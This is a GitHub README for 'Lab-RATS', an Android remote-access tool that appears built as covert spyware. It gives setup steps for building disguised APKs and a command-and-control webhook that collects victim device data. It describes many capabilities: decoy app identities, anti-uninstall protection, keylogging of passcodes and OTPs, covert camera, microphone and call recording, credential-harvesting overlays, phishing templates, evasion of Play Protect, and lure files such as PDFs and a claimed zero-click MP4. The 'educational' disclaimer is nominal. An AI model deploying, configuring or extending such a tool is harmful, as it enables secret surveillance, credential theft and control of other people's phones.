<p align="center">
<img width="1384" height="644" alt="Screenshot 2026-11-11 at 7 21 26 AM" src="https://github.com/user-attachments/assets/cddb6358-11f9-4ed6-a644-3b29c38fe5c2" />

<p align="center">
  <img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
  <img src="https://img.shields.io/badge/Android-SDK_36-green?style=for-the-badge&logo=android&logoColor=white">
  <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=openaccess&logoColor=white">
  <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
  <br>
  <img src="https://img.shields.io/badge/Network-Direct_IPv6/IPv4-informational?style=for-the-badge&logo=gitconnected&logoColor=white">
  <img src="https://img.shields.io/badge/Mode-Stealth_FUD-black?style=for-the-badge&logo=ghostfolio&logoColor=white">
  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
</p>

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=42&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
 />
</p>

> Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*

**Developed from the ground up by K4N3CO, Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The system **automates the generation of custom, signed `.apk` files** for **deployment onto any Android device**, providing **full device telemetry** via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.
<details>
  <summary>📸 Click to View Comparative Breakdown</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/a2beda0b-122b-4e76-9daa-4d543e94dac3" alt="Full Web Page Screenshot" width="70%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
alt="Typing Banner"
 />
</p>

**Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely **eliminating the need for router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
<details>
  <summary><b>📸 Click to View IPv6 Exploit Vector</summary></b>
  <br><p align="center">
  <img src="https://github.com/user-attachments/assets/7097e0e0-1190-4774-b758-ca58b5e8760f" alt="Full Web Page Screenshot" width="80%">
</details>

> [!NOTE]
> **Lab-RATS now supports IPv4 connections** by **hosting on Render.com** *(Free Tier Supported)*. See **"Command & Control Option 2"** below for the **setup guide**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
</p>

### 🔐 Remote C2 Security & Secure Handshake:
> [!IMPORTANT]
> **DEFAULT PASSWORD = admin1337**
- The **C2 Dashboard** is **protected with a secure login** which can be **changed directly from the Terminal/Home page**. The **Default Password should be reset immediately** for **enhanced security**.
- Uses a **masked credential handshake**. Passwords are **reversed and Base64 encoded** *(`0x_` prefixed)* on the **client-side before transmission**, rendering them **invisible to browser Network/Payload inspectors**.

### 📦 Automated APK Generation, Identity Control & Density Scaling:
- **Instantly build** `signed.apk` for **production** and **testing**.
- **Fully** customize **App Name**, **Package ID**, and **Minimum SDK**.
- **Resize logos automatically** for **all Android screen densities**.

### 📱 PC/Mobile Responsive:
- The **remote web interface** is **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for **monitoring from any device**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
</p>

### 💉 APK Payload Delivery Vectors:
- The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.

### 🛡️ Evasion Engine:
-  **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
-  **Deep Stealth HTML Shield**: The C2 dashoard **utilizes Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the **tactical structure is ghosted from analysts**.
-  **Web Hardening**: Assets *(JS/CSS)* are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** *(Right-Click, F12)* to **prevent unauthorized analysis**.
- **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow** and **class names via ProGuard/R8 integration**.
- **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.

### 🎭 Stealth App Decoys:
**Remotely swap the entire Lab-RATS app identity and icon instantly** using **the "Masquerade Library"** of **convincing, fully functional Clones**:
- 👀 **Play Protect** *(Default)*: **Used for initial install** it **simulates a system stability update** and **auto-grants all permissions *(other than Accessibility services)* during the process**, achieving **highly successful installs**.
- 🧮 **Calculator**: **Performs actual math** with a **tactical logic engine**.
- 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
- 🛡️ **Software Update**: **Simulates a legitimate system update screen** to **build target trust**.
- 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the **C2 server interface on device**.

### ☎️ Emergency Recovery & Self Healing:
- **Dialer Unlock**: Type `*#1337#` on the **phone's keypad** to **unmask the Lab-RATS server interface back into view**.
- **Hidden Backdoor**: If the **device is in stealth mode**, **rapidly tap the middle of the decoy screen 10 times** to **unlock the C2 server interface**. *(Reverts to stealth mode again once app is closed)*
- **Automatically detects** and **repairs damaged service bindings** or **revoked permissions in the background**.
- **Anti-Removal**: **On by default** in the **Ghost Tab**, it **prevents the user from uninstalling** or **force-stopping the app** via Settings.

### 🔄 Remote Server Restart:
- **Web UI**: **One-click "RESTART_SERVER" button** on the **Terminal tab** to **refresh background services**.
- **SMS Backdoor**: Send an **SMS/Text containing `!RESTART_C2`** to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.

### 👻 Task-List Ghosting & Dynamic OTA Camouflage:
- The app is **hard-coded** to be **invisible in the Android "Recent Apps" list**.
- Generates **random version names and codes** that **mimic legitimate system OTA updates**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
</p>

### 👻 Ghost Operations:
- **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
- **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
- **Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to **overwhelm the device**.
- **Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
- **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.

### 🧪 Exploit Factory:
- **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
- **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
- **Smishing Library**: Pre-configured **tactical phishing templates**.
- **Shadow Overlay**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** to the device.

### 💀 Anti-Removal & Self Destruct:
- **High-speed, event-driven protection shield** that **Blocks Attempts** to **Uninstall** or **Force Stop** the **app**.
- **Suicide (Self-Destruct)**: **Remote-triggered persistent loop** that **wipes all local configuration** and **initiates a hard uninstallation of the C2 Core**.

### 🛰️ Live GPS Tracking & Intel Stream:
- **One-click uplink** to open the **devices exact real-time location** using **Google Maps**.
- **Intercept every app notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.

### 📸 Tactical Surveillance Hub *(Ultra-Stability)*:
- **Covert Recording**: **Stealthily record video without any user-facing activity**.
- **Snap Photos**: **Covert image capture** integrated into the **live stream**.
- **Nightmode V2**: Aggressive **electronic brightening** for **low-light environments**.

### 🎙️ Acoustics & Interception:
- **Timed or Live microphone recording** and **automated call recording** for **both incoming and outgoing calls**.

### 📂 Advanced Data Uplink:
- **Info Gathering**: Access **Call Logs**, **Contacts**, **Hardware Analytics**, and **Installed Apps** remotely.
- **Integrated File Manager**: **Navigate, download**, and **manage files**. Features an **instant Search Bar** and **Category Filters**.
- **Direct File Editor**: **Live-edit text, JSON**, and **log files** directly **on the device**.

### 🖥️ Enhanced Remote Shell:
The **Terminal Tabs Built-in Shell has been overhauled** for **professional workflows**:
- **Command History**: Navigate **previous commands instantly** using **Up/Down arrows**.
- **Modernized Interface**: Updated to `root@Android` prompt with **an updated `help` menu**.
- **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.

### 📊 Telemetry & Reporting:
- **C2 Auto-Reporting**: **Discrete reporting** of **Date & Time, Device ID, Connection Type *(WiFi/Cellular)*, IP, Port, C2 Dashboard Link, Battery % and more** to a **centralized Google Sheet or Render C2**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"/>
</p>

### 🛠️ Termux Bridge Integration:
**Lab-RATS** features a **high-performance bridge to the Termux environment**. If **Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
- **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are **routed through the bridge**.
- **Unrestricted Tools**: **Install** and **run Python scripts, Nmap scans, or Metasploit** from the **C2 web terminal**.
- **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
> [!NOTE]
> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" *(Most Common)*.
<br>**Solution**: **On the Target Device** open **Termux and run**:
```zsh
echo "allow-external-apps = true" >> ~/.termux/termux.properties
termux-reload-settings
```

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
</p>

**Lab-RATS** supports **TWO primary methods** to **Receive Data, Connect Remotely & Track your Devices**.
### ☝🏻 Option 1: Google Sheet *(Updated)*
**Best for basic IP tracking** and **logging**. **No server maintenance required**.

1. **Create a new** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
2. Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return 
handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    
    // Auto-initialize headers if new sheet
    if (sheet.getLastRow() == 0) {
      sheet.appendRow([
        "Timestamp", 
        "Model #", 
        "Connection Type", 
        "IP Address", 
        "Port", 
        "Active C2 Link", 
        "Battery", 
        "Stealth Status", 
        "Power", 
        "Free Storage"
      ]);
    }
    
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    
    var row = [
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || 
data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ];
    
    sheet.appendRow(row);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3. Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.

> [!IMPORTANT]
> 4. **Copy the Google Webhook URL provided** *(e.g., `https://script.google.com/macros/s/AKfycbwXQSVQ0dYdi...`)* and **prepare to paste it into the APK-builder Tool when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.

<details>
  <summary><b>📸 Click to View Google Sheet Reporting Example</summary></b>
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
</details>

---

### ✌🏻 Option 2: Tactical Node.js Backend
**Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.

**1. Fork the Lab-RATS-v1.6 repository**.
<br>**2. Create a new Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
<br>**3. Once connected, Set the Root Directory** to `c2-server/`
<br>**4. Set the Build Command** to `npm install` & **the Start Command** to `npm start`
<br>**5. Deploy!**

> [!IMPORTANT]
> **Once live, Copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, and **prepare to enter it into the APK-Builder Tool when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.
<details>
  <summary><b>📸 Click to View Render Setup</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
  </details>

<details>
  <summary><b>📸 Click to View Render C2 Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/308a906f-c331-406b-8718-23b2d113a04a" alt="Full Web Page Screenshot" width="80%">
</details>

### Advantages of Option 2:
- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks worldwide**.
- 📂 **Exfiltration Vault**: **Audio/Video recordings** are **automatically uploaded** and **stored on your server**.
- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition** and **NEW 'Quick Action' pull-down menu** to **deploy some features without directly connecting**.
- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your **P2P links are always up-to-date**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
</p>

To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your Environment meets the following requirements**:

### 1. Workstation & Build Requirements: *(To Build APKs)*
* **Java Development Kit (JDK)**: **JDK 17 or JDK 21** *(JDK 21 recommended)*.
    * Ensure `JAVA_HOME` is set in **your environment paths**.
* **Android SDK**: **Android SDK 34** *(API Level 34)* or **higher**.
    * **Build-Tools**: Version `34.0.0` or **higher** *(includes `aapt2`, `zipalign`, and `apksigner`)*.
* **Python 3.x**: Required for **Option 7: Smali Surgery & APK Binder** *(`binder.py`)*.
* **Gradle**: Handled **automatically** via the included `./gradlew` *(Gradle 8.10+)*.

### 2. C2 Server Hosting Requirements: *(For Option 2: Render.com/Railway)*
* **Node.js**: **v18.0.0** or **higher**.
* **npm**: **v9.0.0** or **higher**.
* **Render / Linux Hosting**: 512 MB RAM minimum *(Render Free Tier supported)*.

### 3. Android Device Compatibility:
* **Minimum OS**: **Android 5.0** *(Lollipop/API 21)* or **higher**.
* **Target OS**: **Android 14 - 17** *(API 34 - 37)* **fully supported**.
* **Supported Devices**: **Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG**, and **generic Android devices/
  emulators**.

### 4. Operating System Compatibility:
* 🐧 **Linux**: **Kali Linux, Ubuntu, Debian, Arch** *(Full support for build scripts & C2 server)*.
* 🍎 **macOS**: **macOS Monterey / Ventura / Sonoma / Sequoia** *(Intel & Apple Silicon M1/M2/M3/M4)*.
* 🪟 **Windows**: **Windows 10 / 11 via PowerShell, Command Prompt**, or **WSL2**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
 />
</p>

### 1. Build the APK (on PC)
1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
3.  **Execute** the **Builder**:
    *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
    *   **Windows**: `build.bat`
4.  **Select a Build Strategy**:
    *   **Option 1 (Manual)**: For **standard configuration** of **App Name, ID**, and **Logo** before **building**.
    *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
> [!IMPORTANT]
> 5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting and connections** *("Command & Control Options" section above)*.
6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS-v1.6/apk-builder/output/`

<details>
  <summary><b>📸 Click to View APK-Builder Menu</summary></b>
  <img src="https://github.com/user-attachments/assets/8cb583e6-6c59-46cf-8f94-668f0a34b74e" alt="Full Web Page Screenshot" width="60%">
</details>

### 2. Deploy & Install onto Android Devices
**Deployment** is **a Multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.

#### A. Strategic Weaponization: *(The Wrapper)*
**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder` tool to **wrap your link inside a high-compatibility carrier file**:
*   **📑 Stealth PDF**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
*   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
*   **🔳 QR Code / 📡 NFC**: **Best for physical placement** or **"Tap-to-Infect" proximity delivery**. Generates a **high-density QR** or **NDEF record** pointing to the **hardened delivery URL**.
*   **And Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.

#### B. Hosting Strategies:
*   **Anonymous Cloud**: **Option 6** uses `Catbox.moe` **by default**. It is **anonymous, fast**, and **generates a direct link**. Now has   **fallback hosting on `Litterbox` or `Tmpfiles` if `Catbox.moe` fails**.
*   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.

#### C. Installation & Initialization:
Once the **target device** downloads the **APK**:
1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
2.  **NEW! 'One-Click' Permission Granting (CRITICAL)**: **Open the app ONCE**. **Only the initial Pop-up *(Accessibility Services)* must be manually toggled on**, **ALL other permissions are now auto-granted by the system** using a **convincing security sequence**.
-  -  **Remote Permission Prompt**: If a **User removes any permissions**, you can **remotely trigger the system prompts again** using the **repair buttons** in the **GHOST UTILITIES** section.
3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
4.  **Uplink Confirmation**: Check your **Google Sheet or Render  C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP, Port, C2 Dashboard Link, Battery % and more will appear in the log**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
</p>

**If** you find **Lab-RATS Awesome** and **Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
</p>

**Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!** *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**)*.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
 />
</p>

[<img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">](https://buymeacoffee.com/k4n3co)

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
 />
</p>

### Git Clone & APK-Builder Example *(MacBook-Air M2)*:

https://github.com/user-attachments/assets/035088f1-e906-48c6-a1a6-0f7dd0356276

---

### NEW! 'One-Click' Initial Install Sequence:

https://github.com/user-attachments/assets/f4464f26-8043-4bfa-b55b-c57efb224512

---

### Remote C2 Dashboard - Remote Shell & Decoys:

https://github.com/user-attachments/assets/37109047-b727-4914-b19f-42edcedd770a

---

### Remote C2 Dashboard - Ghost Ops & Locate:

https://github.com/user-attachments/assets/ccaae63f-493b-44b3-a662-f9d1d2792523

---

### Remote C2 Dashboard - Covert Camera Hub:

https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
 />
</p>

### 00. Lab-RATS Server Installed on Android Device:

<details>
  <summary>📸 Click to View App Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/63bc22d1-70cb-47c2-b4ed-f99dc0464ab0" alt="Full Web Page Screenshot" width="30%">
</details>

---

### 01. Home/Terminal Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/7f4e02c5-4984-48e5-a76c-6c4ba530495c" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 02. Ghost Operations Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/3eb33ae7-aebd-4464-8547-979bb296eb27" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 03. Optics/Live Camera Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/bea953b9-753e-412d-b10e-12ded5055d82" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 04. Locate/Live GPS Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/3425ccc3-db7b-43ab-b3b9-8cb3c555469b" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 05. Exploit Factory Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/2aaa4c63-1ee8-4589-a78c-c2fc6e4deadf" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 06. Device Data/Storage Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/835edd2f-35b4-4b7d-b527-c36ffa18990f" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 07. Intel/App Notifications Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/5ff097a0-4460-4a54-a149-253b628f7f01" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 08. SMS/Text Message Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/54acccb7-b412-4a57-9c15-ca36ce58050d" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 09. MMS/Multimedia Message Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/5340b242-bec6-440f-80ae-b1850d6eb163" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 10. Acoustics/Audio Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/4ec71933-6264-4d75-90db-aebfdf40e636" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 11. Comms/Call Logs Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/ae00ca08-43e0-42c8-8bfa-fde16523d096" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 12. Contacts Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/1da37dba-a84a-4e0f-8453-d763e73bade0" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 13. Hardware/Device Info Tab:

<details>
  <summary>📸 Click to View Dashboard Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/f1874c3d-0866-4c1f-9f94-f5ca2c1aed6e" alt="Full Web Page Screenshot" width="80%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
 />
</p>

**Lab-RATS is for Educational and Authorized Security testing purposes ONLY!**. The **Developers & Contributors assume NO Responsibility for ANY** **Misuse, Damage to Devices or Relationships caused by this Software**. **Please use it Responsibly**. **Thank You!**

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
 />
</p>

**Lab-RATS-v1.6** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).

---

<div align="center">
  <video src="https://github.com/user-attachments/assets/2892c9d5-724a-4809-bf3f-1ccd585de0e7" width="50%" controls></video>
</div>

<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
<br>
<p align="center">
<img src="https://img.shields.io/badge/©2026-K4N3CO.LABS-darkgreen?style=for-the-badge&logo=magisk&logoColor=white">
